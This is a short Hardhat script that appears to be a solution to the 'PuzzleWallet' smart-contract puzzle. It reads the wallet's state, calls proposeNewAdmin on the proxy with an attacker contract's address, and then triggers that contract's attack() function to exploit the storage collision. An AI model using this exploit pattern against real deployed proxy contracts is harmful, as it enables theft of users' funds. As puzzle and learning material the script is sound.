import { ethers } from "hardhat";
import { attack } from "../typechain-types/contracts";

const CONTRACT_ADDRESS = "0x8Ba41269ed69496c07bea886c300016A0BA8FB5E"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xee5690088c9271Caf2f5f438ADfBcE716339DEF6"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("PuzzleWallet", CONTRACT_ADDRESS, signer)
  const puzzleContract = await ethers.getContractAt("PuzzleProxy", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("PuzzleWalletAttack", ATTACK_ADDRESS, signer)

  console.log(await contract.owner())
  console.log(await contract.maxBalance())
  console.log(await contract.whitelisted(PLAYER_ADDRESS))

  console.log(await puzzleContract.pendingAdmin())
  await puzzleContract.proposeNewAdmin(ATTACK_ADDRESS)
  await attackContract.attack()
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
